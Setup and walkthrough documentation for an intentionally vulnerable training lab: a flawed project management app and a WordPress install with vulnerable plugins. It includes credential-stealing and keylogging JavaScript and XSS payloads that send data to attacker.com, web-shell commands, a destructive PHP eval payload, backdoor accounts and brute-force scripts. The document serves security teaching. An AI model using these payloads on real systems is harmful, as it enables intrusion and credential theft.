# 🚨 Vulnerable Applications Lab - Complete Documentation

**⚠️ WARNING: This environment contains intentionally vulnerable applications for security research and educational purposes ONLY. Never deploy on public networks!**

---

## 📑 Table of Contents

1. [System Requirements](#1-system-requirements)
2. [Installation & Setup](#2-installation--setup)
3. [Nginx Proxy Manager Configuration](#3-nginx-proxy-manager-configuration)
4. [Local DNS Configuration](#4-local-dns-configuration)
5. [Accessing Applications](#5-accessing-applications)
6. [Project Management App Vulnerabilities](#6-project-management-app-vulnerabilities)
7. [WordPress Exploitation Lab](#7-wordpress-exploitation-lab)
8. [Container Management](#8-container-management)
9. [Network Configuration](#9-network-configuration)
10. [Troubleshooting](#10-troubleshooting)
11. [Legal & Ethical Guidelines](#11-legal--ethical-guidelines)

---

## 1. System Requirements

### Minimum Hardware
- **RAM:** 4GB (8GB recommended)
- **CPU:** 2 cores (4 cores recommended)
- **Disk:** 20GB free space (50GB recommended)
- **Network:** Internet connection (for Docker images and external payload hosting)

### Required Software

| Software | Version | Purpose |
|----------|---------|---------|
| **Git** | Latest | Version control |
| **Docker** | 20.10+ | Container runtime |
| **Docker Compose** | 2.0+ | Multi-container orchestration |
| **Supabase CLI** | Latest | Database management |
| **Python 3** | 3.8+ | Running exploit scripts |

### Port Requirements

The following ports must be available:

| Port(s) | Service | Protocol |
|---------|---------|----------|
| 80 | Nginx Proxy Manager (HTTP) | TCP |
| 81 | Nginx Proxy Manager (Admin UI) | TCP |
| 443 | Nginx Proxy Manager (HTTPS) | TCP |
| 3000 | Project Management App (Direct) | TCP |
| 8080 | WordPress (Direct) | TCP |
| 54321-54327 | Supabase Services | TCP |

---

## 2. Installation & Setup

### 2.1 Install Git

**Linux (Ubuntu/Debian):**
```bash
sudo apt update && sudo apt install git -y
git --version
```

**Linux (Red Hat/CentOS/Fedora):**
```bash
sudo yum install git -y  # or: sudo dnf install git -y
git --version
```

**macOS:**
```bash
brew install git
git --version
```

**Windows:**
1. Download from https://git-scm.com/download/win
2. Run installer with default settings
3. Verify in Command Prompt: `git --version`

**Configure Git:**
```bash
git config --global user.name "Your Name"
git config --global user.email "your@email.com"
```

### 2.2 Install Docker & Docker Compose

**Linux (Ubuntu/Debian):**
```bash
# Install Docker
curl -fsSL https://get.docker.com -o get-docker.sh
sudo sh get-docker.sh

# Add user to docker group (avoid sudo)
sudo usermod -aG docker $USER
newgrp docker

# Verify installation
docker --version
docker compose version
```

**Linux (Red Hat/CentOS/Fedora):**
```bash
# Add Docker repository
sudo yum install -y yum-utils
sudo yum-config-manager --add-repo https://download.docker.com/linux/centos/docker-ce.repo

# Install Docker
sudo yum install docker-ce docker-ce-cli containerd.io docker-compose-plugin -y

# Start and enable Docker
sudo systemctl start docker
sudo systemctl enable docker

# Add user to docker group
sudo usermod -aG docker $USER
newgrp docker

# Verify
docker --version
docker compose version
```

**macOS:**
1. Download Docker Desktop: https://www.docker.com/products/docker-desktop
2. Install and start Docker Desktop
3. Verify in Terminal:
```bash
docker --version
docker compose version
```

**Windows:**
1. Download Docker Desktop: https://www.docker.com/products/docker-desktop
2. Install Docker Desktop
3. Restart Windows
4. Start Docker Desktop
5. Verify in PowerShell:
```powershell
docker --version
docker compose version
```

### 2.3 Install Supabase CLI

**Linux/macOS:**
```bash
# Via npm (requires Node.js)
npm install -g supabase

# Via Homebrew (macOS only)
brew install supabase/tap/supabase

# Verify
supabase --version
```

**Windows:**
```powershell
# Via npm (requires Node.js)
npm install -g supabase

# Via Scoop
scoop bucket add supabase https://github.com/supabase/scoop-bucket.git
scoop install supabase

# Verify
supabase --version
```

### 2.4 Clone Repository & Deploy

```bash
# Clone repository
git clone <repository-url>
cd vulnapps-example

# Make scripts executable (Linux/macOS only)
chmod +x scripts/*.sh

# Deploy all services
./scripts/deploy.sh
```

**Deployment Process:**
1. ✅ Docker health check
2. ✅ Stop existing services (if any)
3. ✅ Create Docker network (`vulnapp-network`)
4. ✅ Start Supabase (14 containers)
5. ✅ Connect Supabase to network
6. ✅ Build Project Management app
7. ✅ Start WordPress + MySQL
8. ✅ Start Nginx Proxy Manager
9. ✅ Display service URLs

**Expected Time:** 2-3 minutes for first deployment, ~30 seconds for subsequent deployments.

---

## 3. Nginx Proxy Manager Configuration

### 3.1 Why Use Nginx Proxy Manager?

**Benefits:**
- ✅ Professional domain-based access
- ✅ Centralized SSL/TLS management
- ✅ Easy proxy configuration via web UI
- ✅ Access control and IP restrictions
- ✅ Simulates real production environment

**Without NPM:** Applications accessed via `localhost:PORT` (not realistic)  
**With NPM:** Applications accessed via `project.tujuh` and `wordpress.tujuh` (realistic)

### 3.2 Access NPM Admin Panel

```
URL: http://localhost:81
Default Email: admin@example.com
Default Password: changeme
```

**First Login:**
1. Login with default credentials
2. You'll be prompted to change password
3. Update email and create strong password
4. Save credentials securely

### 3.3 Configure Proxy for Project Management App

**Step 1:** Click **Hosts** → **Proxy Hosts** → **Add Proxy Host**

**Step 2:** Configure **Details** tab:
```
Domain Names: project.tujuh
Scheme: http
Forward Hostname/IP: vulnapp-webapp
Forward Port: 80
```

**Important:**
- ✅ Use container name `vulnapp-webapp` (NOT localhost)
- ✅ Use port `80` (container's internal port, NOT 3000)
- ✅ Enable "Cache Assets"
- ✅ Enable "Websockets Support"
- ❌ DON'T enable "Block Common Exploits" (we want vulnerabilities accessible)

**Step 3:** Click **Advanced** tab and add:
```nginx
# Proxy API calls to Supabase
location /api/ {
    rewrite ^/api/(.*) /$1 break;
    proxy_pass http://HOST_IP:54321;
    proxy_set_header Host $host;
    proxy_set_header X-Real-IP $remote_addr;
    proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    proxy_set_header X-Forwarded-Proto $scheme;
}

# Main app
location / {
    proxy_pass http://vulnapp-webapp:80;
    proxy_set_header Host $host;
    proxy_set_header X-Real-IP $remote_addr;
    proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    proxy_set_header X-Forwarded-Proto $scheme;
}
```

**Replace `HOST_IP`** with your machine's IP:
```bash
# Linux/macOS
ip addr show | grep "inet " | grep -v 127.0.0.1 | awk '{print $2}' | cut -d/ -f1 | head -1

# Or simply use
hostname -I | awk '{print $1}'
```

**Step 4:** Click **Save**

### 3.4 Configure Proxy for WordPress

**Step 1:** Click **Add Proxy Host** again

**Step 2:** Configure **Details** tab:
```
Domain Names: wordpress.tujuh
Scheme: http
Forward Hostname/IP: vulnerable-wordpress
Forward Port: 80
```

**Important:**
- ✅ Use container name `vulnerable-wordpress` (NOT localhost)
- ✅ Use port `80` (container's internal port, NOT 8080)
- ✅ Enable "Cache Assets"
- ❌ DON'T enable "Block Common Exploits" (for vulnerability testing)

**Step 3:** Click **Advanced** tab and add:
```nginx
# WordPress specific settings
client_max_body_size 64M;

# Proxy headers
proxy_set_header Host $host;
proxy_set_header X-Real-IP $remote_addr;
proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
proxy_set_header X-Forwarded-Proto $scheme;
proxy_set_header X-Forwarded-Host $host;
```

**Step 4:** Click **Save**

### 3.5 Verify NPM Configuration

```bash
# Test Project Management App proxy
curl -I http://localhost:80 -H "Host: project.tujuh"
# Should return: HTTP/1.1 200 OK

# Test WordPress proxy
curl -I http://localhost:80 -H "Host: wordpress.tujuh"
# Should return: HTTP/1.1 200 OK or 302 (redirect to install)
```

---

## 4. Local DNS Configuration

### 4.1 Linux/macOS Configuration

**Edit hosts file:**
```bash
sudo nano /etc/hosts
```

**Add entries:**
```
127.0.0.1    project.tujuh
127.0.0.1    wordpress.tujuh
```

**Save and exit:**
- Press `Ctrl + X`
- Press `Y` to confirm
- Press `Enter`

**Verify:**
```bash
# Check entries
cat /etc/hosts | grep tujuh

# Test DNS resolution
ping -c 2 project.tujuh
ping -c 2 wordpress.tujuh
```

### 4.2 Windows Configuration

**Step 1:** Open Notepad as Administrator
- Press `Windows Key`
- Type "Notepad"
- Right-click → "Run as administrator"

**Step 2:** Open hosts file
- Click File → Open
- Navigate to: `C:\Windows\System32\drivers\etc\`
- Change filter to "All Files (*.*)"
- Select `hosts` file
- Click Open

**Step 3:** Add entries at the end:
```
127.0.0.1    project.tujuh
127.0.0.1    wordpress.tujuh
```

**Step 4:** Save and close
- File → Save
- Close Notepad

**Step 5:** Flush DNS cache
```cmd
ipconfig /flushdns
```

**Verify:**
```cmd
ping project.tujuh
ping wordpress.tujuh
```

### 4.3 Network Access (Remote Machines)

To access from other computers on your network:

**Step 1:** Find your host machine's IP
```bash
# Linux/macOS
hostname -I | awk '{print $1}'

# Windows
ipconfig | findstr IPv4
```

**Step 2:** On remote machine, edit hosts file
```
# Replace <HOST_IP> with your server's IP
<HOST_IP>    project.tujuh
<HOST_IP>    wordpress.tujuh

# Example:
192.168.1.100    project.tujuh
192.168.1.100    wordpress.tujuh
```

**Step 3:** Test from remote machine
```bash
curl -I http://project.tujuh
curl -I http://wordpress.tujuh
```

---

## 5. Accessing Applications

### 5.1 Project Management App

**URL:** http://project.tujuh

**First Access:**
1. Navigate to http://project.tujuh
2. Click "Register" or "Sign Up"
3. Create account (use any email/password)
4. Login with your credentials
5. Explore the vulnerable application

**Features:**
- Project management dashboard
- Task creation and tracking
- Team collaboration
- File upload (RCE vulnerability!)
- Chat functionality (XSS vulnerability!)
- User management

### 5.2 WordPress

**URL:** http://wordpress.tujuh

**First Access - Installation:**
1. Navigate to http://wordpress.tujuh
2. Select language
3. Click "Let's go!"
4. Database connection details (auto-filled):
   - Database Name: `wordpress`
   - Username: `wordpress`
   - Password: `vulnerable_wp_pass`
   - Database Host: `wordpress-db`
   - Table Prefix: `wp_`
5. Click "Submit" → "Run the installation"
6. **Site Information (IMPORTANT for brute force testing):**
   - Site Title: `Vulnerable WP Lab`
   - Username: `admin` ⚠️
   - Password: `admin` ⚠️ (intentionally weak for testing!)
   - Your Email: (any email)
   - Uncheck "Discourage search engines"
7. Click "Install WordPress"
8. Login with `admin` / `admin`

**Install Vulnerable Plugins:**
1. Go to **Plugins** → **Add New**
2. Search "WP File Manager"
   - Install version 6.4 or earlier
   - Click "Activate"
3. Search "Social Warfare"
   - Install version 3.5.2 or earlier
   - Click "Activate"

### 5.3 Additional Services

| Service | URL | Purpose |
|---------|-----|---------|
| **NPM Admin** | http://localhost:81 | Manage proxies, SSL, access control |
| **Supabase Studio** | http://localhost:54323 | Database management, SQL editor |
| **Supabase API** | http://localhost:54321 | Direct API access |
| **Mailpit** | http://localhost:54324 | Email testing |

---

## 6. Project Management App Vulnerabilities

### 6.1 Overview

The Project Management application contains **4 critical vulnerabilities** that demonstrate common web application security flaws.

| Vulnerability | CVSS | Location | Impact |
|---------------|------|----------|--------|
| File Upload RCE | 10.0 | Files component | Complete system compromise |
| Stored XSS | 8.5 | Chat component | Session hijacking, credential theft |
| Plaintext Credentials | 9.0 | Authentication | Password exposure |
| Broken Authentication | 7.5 | Login system | Unauthorized access |

### 6.2 Vulnerability 1: File Upload RCE

**Description:**  
Files uploaded through the application are automatically executed using `eval()` without any validation or sanitization.

**Location:** `project-management/src/components/Files/Files.tsx`

**Attack Steps:**

1. **Create malicious JavaScript file** (`rce-test.js`):
```javascript
// Simple proof of concept
alert('🚨 REMOTE CODE EXECUTION SUCCESSFUL! 🚨');

// Display current cookies
alert('Cookies: ' + document.cookie);

// Visual proof
document.body.style.border = '10px solid red';
document.body.style.backgroundColor = '#ffeeee';
```

2. **Login to application**
   - Navigate to http://project.tujuh
   - Login with your account

3. **Navigate to Files section**
   - Click on any project
   - Go to "Files" tab

4. **Upload malicious file**
   - Click "Upload File"
   - Select `rce-test.js`
   - File executes **immediately** upon upload!

**Advanced Exploit - Credential Theft:**
```javascript
// Save as advanced-rce.js
(function() {
    // Steal all credentials from cookies
    const cookies = document.cookie.split(';').reduce((acc, cookie) => {
        const [key, value] = cookie.trim().split('=');
        acc[key] = decodeURIComponent(value);
        return acc;
    }, {});
    
    // Extract sensitive data
    const stolen = {
        email: cookies.user_email,
        password: cookies.user_password,  // PLAINTEXT!
        userId: cookies.user_id,
        userRole: cookies.user_role,
        allCookies: document.cookie,
        localStorage: JSON.stringify(localStorage),
        sessionStorage: JSON.stringify(sessionStorage),
        currentURL: window.location.href,
        userAgent: navigator.userAgent,
        timestamp: new Date().toISOString()
    };
    
    // Exfiltrate data (replace with your server)
    fetch('http://attacker.com/collect', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify(stolen)
    });
    
    // Install persistent backdoor
    localStorage.setItem('backdoor_installed', JSON.stringify({
        credentials: stolen,
        installedAt: new Date().toISOString()
    }));
    
    // Install keylogger
    document.addEventListener('keydown', (e) => {
        fetch('http://attacker.com/keylog?key=' + encodeURIComponent(e.key));
    });
    
    // Visual confirmation
    alert('COMPLETE BREACH!\n\n' +
          'Email: ' + stolen.email + '\n' +
          'Password: ' + stolen.password + '\n' +
          'Role: ' + stolen.userRole);
    
    // Add visual indicator
    const banner = document.createElement('div');
    banner.innerHTML = '🚨 SYSTEM COMPROMISED - All Credentials Stolen! 🚨';
    banner.style.cssText = 'position:fixed;top:0;left:0;width:100%;background:red;color:white;text-align:center;padding:15px;font-weight:bold;z-index:10000;font-size:18px;';
    document.body.appendChild(banner);
})();
```

**Business Impact:**
- ✅ Complete account takeover
- ✅ Theft of all user credentials
- ✅ Session hijacking
- ✅ Data exfiltration
- ✅ Persistent backdoor installation
- ✅ Keylogger for future credential capture

### 6.3 Vulnerability 2: Stored Cross-Site Scripting (XSS)

**Description:**  
Chat messages are rendered using `innerHTML` without sanitization, allowing persistent script injection.

**Location:** `project-management/src/components/Chat/Chat.tsx`

**Attack Steps:**

1. **Navigate to Chat**
   - Click on any project
   - Go to "Chat" tab

2. **Inject XSS payload**

**Basic XSS:**
```html
<script>alert('XSS Vulnerability!')</script>
```

**Image-based XSS:**
```html
<img src="x" onerror="alert('Cookie: ' + document.cookie)">
```

**Advanced XSS - Session Hijacking:**
```html
<img src="x" onerror="
(function(){
    const data = {
        cookies: document.cookie,
        localStorage: JSON.stringify(localStorage),
        url: window.location.href
    };
    fetch('http://attacker.com/steal', {
        method: 'POST',
        body: JSON.stringify(data)
    });
    alert('Session hijacked!');
})();
">
```

**Persistent Keylogger:**
```html
<img src="x" onerror="
document.addEventListener('keydown', function(e) {
    console.log('Key captured: ' + e.key);
    fetch('http://attacker.com/keys?k=' + e.key);
});
alert('Keylogger installed via XSS!');
">
```

**DOM Manipulation:**
```html
<img src="x" onerror="
document.body.innerHTML = '<h1 style=color:red>HACKED!</h1><p>All your data belongs to us.</p>';
">
```

**Business Impact:**
- ✅ Every user viewing the chat is affected
- ✅ Scripts execute automatically
- ✅ Persistent storage in database
- ✅ Can steal credentials from all users
- ✅ Can deface the application
- ✅ Can redirect users to malicious sites

### 6.4 Vulnerability 3: Plaintext Credential Storage

**Description:**  
User passwords are stored in cookies in plaintext, making them easily accessible via JavaScript.

**Location:** `project-management/src/contexts/AuthContext.tsx`

**Attack Steps:**

1. **Login to application**
   - Navigate to http://project.tujuh
   - Login with any credentials

2. **Open Browser DevTools** (F12)

3. **Go to Application → Storage → Cookies**

4. **Observe plaintext credentials:**
   - `user_email` - User's email address
   - `user_password` - User's password in **PLAINTEXT**!
   - `user_id` - User ID
   - `user_role` - User role

5. **Access via JavaScript Console:**
```javascript
// View all cookies
document.cookie

// Parse cookies into object
const cookies = document.cookie.split(';').reduce((acc, cookie) => {
    const [key, value] = cookie.trim().split('=');
    acc[key] = decodeURIComponent(value);
    return acc;
}, {});

console.log('Stolen Credentials:');
console.log('Email:', cookies.user_email);
console.log('Password:', cookies.user_password);  // PLAINTEXT!
console.log('User ID:', cookies.user_id);
console.log('Role:', cookies.user_role);
```

**Exploitation via XSS:**
```html
<!-- Inject in chat to steal all users' credentials -->
<img src="x" onerror="
const cookies = document.cookie.split(';').reduce((acc, c) => {
    const [k,v] = c.trim().split('=');
    acc[k] = decodeURIComponent(v);
    return acc;
}, {});
fetch('http://attacker.com/creds', {
    method: 'POST',
    body: JSON.stringify({
        email: cookies.user_email,
        password: cookies.user_password,
        timestamp: new Date().toISOString()
    })
});
">
```

**Business Impact:**
- ✅ Complete credential exposure
- ✅ No encryption or hashing
- ✅ Accessible via any XSS
- ✅ Accessible via File Upload RCE
- ✅ Persists after logout
- ✅ GDPR/compliance violations

### 6.5 Vulnerability 4: Broken Authentication

**Description:**  
Multiple authentication flaws including weak password requirements, no rate limiting, and hardcoded backdoor accounts.

**Location:** `project-management/src/components/Auth/`

**Flaws:**
1. ✅ Accepts extremely weak passwords ("1", "a", "123")
2. ✅ No password strength requirements
3. ✅ Unlimited login attempts (no rate limiting)
4. ✅ No account lockout after failed attempts
5. ✅ No CAPTCHA
6. ✅ Hardcoded backdoor accounts
7. ✅ Insecure session management

**Backdoor Accounts:**
```
Email: admin@backdoor.com
Password: 123

Email: test@test.com
Password: test

Email: guest@guest.com
Password: (empty/blank)
```

**Attack Steps:**

**Test 1: Weak Password Registration**
```bash
# Try registering with various weak passwords
# All of these are accepted:
- Password: 1
- Password: a
- Password: 123
- Password: admin
```

**Test 2: Brute Force (No Rate Limiting)**
```bash
# Create password list
cat > passwords.txt <<EOF
password
123456
admin
admin123
password123
EOF

# Test unlimited attempts (no lockout)
for pass in $(cat passwords.txt); do
    echo "Testing: $pass"
    curl -X POST http://project.tujuh/api/auth/login \
         -H "Content-Type: application/json" \
         -d "{\"email\":\"target@example.com\",\"password\":\"$pass\"}"
    sleep 0.5
done
```

**Test 3: Backdoor Access**
```bash
# Instant admin access
curl -X POST http://project.tujuh/api/auth/login \
     -H "Content-Type: application/json" \
     -d '{"email":"admin@backdoor.com","password":"123"}'
```

**Business Impact:**
- ✅ Easy brute force attacks
- ✅ Weak passwords accepted
- ✅ Backdoor accounts = instant compromise
- ✅ No defense against automated attacks
- ✅ Compliance violations (PCI-DSS, SOC 2)

---

## 7. WordPress Exploitation Lab

### 7.1 Overview

The WordPress lab demonstrates **3 real-world attack vectors**:

| Attack Vector | Type | CVSS | Impact |
|---------------|------|------|--------|
| CVE-2020-25213 | File Manager RCE | 10.0 | Complete system compromise |
| CVE-2019-9978 | Social Warfare RCE | 9.8 | Remote code execution |
| Weak Credentials | Brute Force | 8.0 | Administrative access |

### 7.2 WordPress Setup

**Prerequisites:**
1. ✅ WordPress installed at http://wordpress.tujuh
2. ✅ Weak credentials configured: `admin` / `admin`
3. ✅ Vulnerable plugins installed:
   - WP File Manager (v6.4 or earlier)
   - Social Warfare (v3.5.2 or earlier)

### 7.3 Exploit 1: CVE-2020-25213 (File Manager RCE)

**Vulnerability Details:**
- **CVE ID:** CVE-2020-25213
- **CVSS Score:** 10.0 (Critical)
- **Plugin:** WP File Manager versions 6.0 - 6.8
- **Authentication:** Not required
- **Type:** Unauthenticated Remote File Upload
- **Affected Versions:** 1+ million WordPress sites

**How it Works:**
1. Plugin exposes `connector.minimal.php` endpoint
2. No authentication required for file operations
3. Allows arbitrary file upload including PHP shells
4. Uploaded files are executable
5. Leads to complete server compromise

**Exploitation:**

```bash
cd wordpress/exploits
python3 cve-2020-25213-file-manager-rce.py http://wordpress.tujuh
```

**Exploit Actions:**
1. ✅ Uploads PHP backdoor to `/wp-content/plugins/wp-file-manager/lib/files/shell.php`
2. ✅ Verifies backdoor is accessible
3. ✅ Extracts database credentials from `wp-config.php`
4. ✅ Creates malicious WordPress post via API
5. ✅ Adds fake popularity metrics (999,999 views, 9,999 comments)
6. ✅ Makes post sticky (homepage featured)
7. ✅ Verifies public visibility

**Expected Output:**
```
[+] CVE-2020-25213 File Manager RCE Exploit
[+] Target: http://wordpress.tujuh
[+] Testing endpoint accessibility...
[+] Endpoint is vulnerable!
[+] Uploading backdoor shell...
[+] Backdoor uploaded successfully!
[+] Backdoor URL: http://wordpress.tujuh/wp-content/plugins/wp-file-manager/lib/files/shell.php
[+] Testing backdoor...
[+] Backdoor is functional!
[+] Creating malicious post...
[+] Post created with ID: 42
[+] Adding fake metrics...
[+] Post promoted: 999,999 views, 9,999 comments
[+] Post is sticky (featured on homepage)
[+] Verifying public visibility...
[+] ✅ EXPLOITATION SUCCESSFUL!
[+] Post is publicly visible at: http://wordpress.tujuh/?p=42
```

**Manual Backdoor Commands:**
```bash
# Command execution
curl "http://wordpress.tujuh/wp-content/plugins/wp-file-manager/lib/files/shell.php?cmd=whoami"

# List files
curl "http://wordpress.tujuh/wp-content/plugins/wp-file-manager/lib/files/shell.php?cmd=ls+-la"

# Read wp-config.php
curl "http://wordpress.tujuh/wp-content/plugins/wp-file-manager/lib/files/shell.php?cmd=cat+../../../wp-config.php"

# Database access
curl "http://wordpress.tujuh/wp-content/plugins/wp-file-manager/lib/files/shell.php?cmd=mysql+-u+wordpress+-pvulnerable_wp_pass+wordpress+-e+'SELECT+*+FROM+wp_users'"
```

**Business Impact:**
- ✅ No authentication required
- ✅ Complete server control
- ✅ Database access
- ✅ Content manipulation
- ✅ User data theft
- ✅ Malware distribution capability

### 7.4 Exploit 2: CVE-2019-9978 (Social Warfare RCE)

**Vulnerability Details:**
- **CVE ID:** CVE-2019-9978
- **CVSS Score:** 9.8 (Critical)
- **Plugin:** Social Warfare versions 3.5.0 - 3.5.2
- **Authentication:** Not required
- **Type:** Remote Code Execution via eval()
- **Attack Vector:** Debug mode abuse

**How it Works:**
1. Plugin has debug mode enabled by default
2. Debug endpoint fetches remote payload URLs
3. Payload is executed using `eval()` without validation
4. Attacker hosts malicious PHP code externally
5. WordPress fetches and executes attacker's code

**Payload Hosting (Realistic Attack):**

**Option A: GitHub Gist (Recommended)**
1. Go to https://gist.github.com/
2. Create new secret gist
3. Filename: `payload.txt`
4. Content: Copy from `wordpress/exploits/payload.txt`
5. Create gist
6. Click "Raw" button
7. Copy raw URL

**Option B: Pastebin**
1. Go to https://pastebin.com/
2. Paste payload content
3. Create paste
4. Click "raw"
5. Copy raw URL

**Option C: ngrok Tunnel**
```bash
# Terminal 1: Start local server
cd wordpress/exploits
python3 -m http.server 8000

# Terminal 2: Create tunnel
ngrok http 8000
# Copy HTTPS URL
```

**Payload Content** (`wordpress/exploits/payload.txt`):
```php
<pre>
(function(){
    require_once('/var/www/html/wp-load.php');
    
    $post_data = array(
        'post_title' => 'EXPLOITED: Unauthorized Content via CVE-2019-9978',
        'post_content' => '<h1>🚨 SECURITY BREACH 🚨</h1>
<p><strong>This post was created WITHOUT AUTHENTICATION</strong></p>
<p><strong>Attack Vector:</strong> CVE-2019-9978 - Social Warfare Plugin RCE</p>
<ul>
<li>Plugin fetched remote payload</li>
<li>Executed via eval() function</li>
<li>Created post via WordPress API</li>
<li>Promoted without authorization</li>
<li>Added fake popularity metrics</li>
</ul>
<p style="color:red;font-size:20px;"><strong>CVSS 9.8 CRITICAL</strong></p>',
        'post_status' => 'publish',
        'post_author' => 1,
        'post_type' => 'post',
        'post_date' => current_time('mysql'),
        'comment_status' => 'open'
    );
    
    $post_id = wp_insert_post($post_data);
    
    if($post_id) {
        global $wpdb;
        // Add fake metrics
        $wpdb->update($wpdb->posts, 
            array('comment_count' => 9999), 
            array('ID' => $post_id)
        );
        update_post_meta($post_id, 'post_views_count', 999999);
        stick_post($post_id);
        
        // Delete old posts for homepage visibility
        $old_posts = get_posts(array(
            'numberposts' => -1,
            'post_type' => 'post',
            'exclude' => array($post_id)
        ));
        foreach($old_posts as $old_post) {
            wp_delete_post($old_post->ID, true);
        }
        
        die("POST_ID:" . $post_id . "|STATUS:published|STICKY:yes");
    } else {
        die("ERROR:Failed");
    }
    
    return array();
})()
</pre>
```

**Exploitation:**
```bash
cd wordpress/exploits

# Replace with your hosted payload URL
python3 cve-2019-9978-remote.py http://wordpress.tujuh \
  --payload-url https://gist.githubusercontent.com/USERNAME/GIST_ID/raw/HASH/payload.txt
```

**Expected Output:**
```
[+] CVE-2019-9978 Social Warfare RCE Exploit
[+] Target: http://wordpress.tujuh
[+] Payload URL: https://gist.githubusercontent.com/.../payload.txt
[+] Testing payload accessibility...
[+] ✅ Payload is accessible
[+] Triggering Social Warfare debug mode...
[+] Sending exploit request...
[+] ✅ Exploit sent successfully!
[+] Parsing response...
[+] POST_ID:43|STATUS:published|STICKY:yes
[+] ✅ EXPLOITATION SUCCESSFUL!
[+] Post created with ID: 43
[+] Post is published and sticky
[+] Verify at: http://wordpress.tujuh/?p=43
```

**Why External Hosting?**
- ✅ Simulates real attacker scenario
- ✅ No access to target infrastructure needed
- ✅ Demonstrates egress filtering gaps
- ✅ Realistic attack vector
- ✅ Shows why monitoring outbound connections matters

**Business Impact:**
- ✅ Unauthenticated RCE
- ✅ No file upload needed
- ✅ Content creation/manipulation
- ✅ Fake news distribution
- ✅ SEO poisoning
- ✅ Brand reputation damage

### 7.5 Exploit 3: Weak Admin Credentials (Brute Force)

**Vulnerability Details:**
- **Type:** Authentication Weakness
- **CVSS Score:** 8.0 (High)
- **Attack Vector:** Credential Guessing / Brute Force
- **Authentication:** Bypassed through guessing

**Weaknesses:**
1. ✅ No rate limiting on login attempts
2. ✅ No account lockout mechanism
3. ✅ No CAPTCHA
4. ✅ Accepts very weak passwords
5. ✅ Common username ("admin")
6. ✅ No failed login notifications

**Manual Testing:**

**Test 1: Common Passwords**
```bash
# Create wordlist
cat > wp-passwords.txt <<EOF
admin
password
123456
wordpress
admin123
letmein
welcome
monkey
dragon
master
EOF

# Test each password
for password in $(cat wp-passwords.txt); do
    echo "[*] Testing password: $password"
    
    response=$(curl -s -X POST http://wordpress.tujuh/wp-login.php \
        -d "log=admin&pwd=$password&wp-submit=Log+In" \
        -L -c cookies.txt -w "%{http_code}" -o /dev/null)
    
    if [ "$response" == "200" ]; then
        # Check if login successful
        if grep -q "wordpress_logged_in" cookies.txt; then
            echo "[+] ✅ SUCCESS! Password found: $password"
            break
        fi
    fi
    
    sleep 0.5  # Small delay (no lockout, so not necessary)
done
```

**Test 2: Using WPScan**
```bash
# Install WPScan (if not installed)
gem install wpscan

# Run brute force
wpscan --url http://wordpress.tujuh \
       --usernames admin \
       --passwords wp-passwords.txt \
       --password-attack wp-login
```

**Test 3: Using Hydra**
```bash
# Install Hydra
sudo apt install hydra  # Linux
brew install hydra      # macOS

# Run brute force
hydra -l admin -P wp-passwords.txt wordpress.tujuh http-post-form \
  "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=ERROR"
```

**Automated Python Script:**
```python
#!/usr/bin/env python3
import requests
import sys

target = "http://wordpress.tujuh/wp-login.php"
username = "admin"

passwords = [
    "admin", "password", "123456", "wordpress",
    "admin123", "letmein", "welcome", "monkey"
]

print("[*] Starting WordPress brute force attack")
print(f"[*] Target: {target}")
print(f"[*] Username: {username}")
print(f"[*] Testing {len(passwords)} passwords...")

session = requests.Session()

for password in passwords:
    print(f"[*] Trying: {password}")
    
    data = {
        'log': username,
        'pwd': password,
        'wp-submit': 'Log In',
        'redirect_to': '/wp-admin/',
        'testcookie': '1'
    }
    
    response = session.post(target, data=data, allow_redirects=True)
    
    # Check if login successful
    if 'wordpress_logged_in' in session.cookies.get_dict():
        print(f"[+] ✅ SUCCESS! Password found: {password}")
        print(f"[+] Login successful!")
        sys.exit(0)
    else:
        print(f"[-] Failed: {password}")

print("[-] Brute force failed. Password not in wordlist.")
```

**What Successful Login Gives:**
1. ✅ Full WordPress admin dashboard access
2. ✅ Ability to create/modify/delete all content
3. ✅ Install malicious plugins/themes
4. ✅ Manage all user accounts
5. ✅ Modify database via plugins
6. ✅ Upload arbitrary files
7. ✅ Change site settings
8. ✅ Access to user data

**Defensive Recommendations:**
- ❌ Never use "admin" as username
- ❌ Never use weak passwords
- ✅ Implement rate limiting
- ✅ Add account lockout (e.g., 3 failed attempts = 15 min lockout)
- ✅ Use CAPTCHA after failed attempts
- ✅ Enable 2FA (Two-Factor Authentication)
- ✅ Monitor failed login attempts
- ✅ Use strong password policy
- ✅ Implement IP-based blocking

**Business Impact:**
- ✅ Complete administrative access
- ✅ Content manipulation
- ✅ User data theft
- ✅ Malware distribution
- ✅ SEO poisoning
- ✅ Brand damage

---

## 8. Container Management

### 8.1 Deployment

**Deploy all services:**
```bash
./scripts/deploy.sh
```

**What happens:**
1. Docker health check
2. Stop existing services
3. Create network (`vulnapp-network`)
4. Start Supabase (14 containers)
5. Build web app image
6. Start WordPress + MySQL
7. Start Nginx Proxy Manager

**Deployment time:** ~2-3 minutes first time, ~30 seconds subsequent

### 8.2 Stopping Services

**Stop all services:**
```bash
./scripts/stop.sh
```

**What happens:**
1. Stop Docker Compose services
2. Remove containers
3. Clean WordPress volumes
4. Stop Supabase
5. Clear Supabase port conflicts

**Preservation:**
- ✅ Docker volumes preserved (unless explicitly removed)
- ✅ NPM configuration preserved
- ✅ Supabase data backed up

### 8.3 Complete Reset

**Full reset (deletes all data):**
```bash
# Stop everything
./scripts/stop.sh

# Remove all volumes
docker volume rm wordpress-data wordpress-db-data npm-data npm-letsencrypt

# Reset Supabase
supabase db reset

# Deploy fresh
./scripts/deploy.sh
```

### 8.4 Individual Service Management

**Restart specific service:**
```bash
docker-compose restart webapp
docker-compose restart wordpress
docker-compose restart nginx-proxy-manager
```

**Rebuild web app:**
```bash
docker-compose up -d --build webapp
```

**View logs:**
```bash
# All services
docker-compose logs -f

# Specific service
docker-compose logs -f webapp
docker-compose logs -f wordpress
docker-compose logs -f nginx-proxy-manager

# Supabase
docker logs -f supabase_kong_managment
```

**Execute commands in containers:**
```bash
# WordPress CLI
docker exec vulnerable-wordpress wp --info --allow-root
docker exec vulnerable-wordpress wp plugin list --allow-root
docker exec vulnerable-wordpress wp user list --allow-root

# MySQL CLI
docker exec -it wordpress-mysql mysql -u wordpress -pvulnerable_wp_pass wordpress

# Shell access
docker exec -it vulnerable-wordpress bash
docker exec -it wordpress-mysql bash
```

### 8.5 Monitoring

